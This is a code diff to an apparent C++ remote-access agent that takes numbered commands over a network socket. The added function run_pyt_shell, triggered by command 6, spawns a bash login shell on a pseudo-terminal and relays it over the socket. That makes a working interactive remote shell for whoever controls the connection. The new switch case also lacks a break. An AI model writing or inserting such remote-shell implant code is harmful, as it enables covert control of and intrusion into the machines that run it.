@@ -7,6 +7,7 @@
 #include <unistd.h>
 #include <cstring>
 #include <fstream>
+#include <pty.h>
 
 struct PacketHeader {
     uint32_t command_id;
@@ -64,6 +65,72 @@ void send_response(int sock, uint32_t cmd_id, const std::string &msg) {
     resp_header.data_len = htonl(msg.size());
     send(sock, &resp_header, sizeof(resp_header), 0);
     send(sock, msg.c_str(), msg.size(), 0);
+}
+
+void run_pyt_shell(int sock) {
+    int master_fd;
+
+    pid_t pid = forkpty(&master_fd, nullptr, nullptr, nullptr);
+
+    if (pid < 0) {
+        send_response(sock, 5, "Couldn't create PTY");
+        return;
+    }
+
+    if (pid == 0) {
+        setenv("TERM", "xterm-256color", 1);
+        execl("/bin/bash", "bash", "--login", nullptr);
+        exit(1);
+    }
+
+    char buffer[4096];
+    fd_set fds;
+    bool running = true;
+
+    while (running) {
+        FD_ZERO(&fds);
+        FD_SET(sock, &fds);
+        FD_SET(master_fd, &fds);
+
+        int max_fd = (sock > master_fd) ? sock : master_fd;
+
+        int activity = select(max_fd + 1, &fds, nullptr, nullptr, nullptr);
+        if (activity < 0) break;
+
+        if (FD_ISSET(sock, &fds)) {
+            ssize_t bytes_recv = recv(sock, buffer, sizeof(buffer), 0);
+            if (bytes_recv <= 0) {
+                running = false;
+                break;
+            }
+            if (write(master_fd, buffer, bytes_recv) < 0) {
+                running = false;
+                break;
+            }
+        }
+
+        if (FD_ISSET(master_fd, &fds)) {
+            ssize_t bytes_read = read(master_fd, buffer, sizeof(buffer));
+
+            if (bytes_read <= 0) {
+                running = false;
+                break;
+            }
+
+            if (send(sock, buffer, bytes_read, 0) <= 0) {
+                running = false;
+                break;
+            }
+        }
+    }
+
+    close(master_fd);
+    kill(pid, SIGKILL);
+    int status;
+    waitpid(pid, &status, 0);
+
+    std::string eof_seq = "\xff\xff\xff\xff_EOF_";
+    send(sock, eof_seq.c_str(), eof_seq.size(), 0);
 }
 
 int main() {
@@ -175,6 +242,8 @@ int main() {
                     session_active = false;
                     terminate_agent = true;
                     break;
+                } case 6: {
+                    run_pyt_shell(sock);
                 }
                 default: {
                     break;
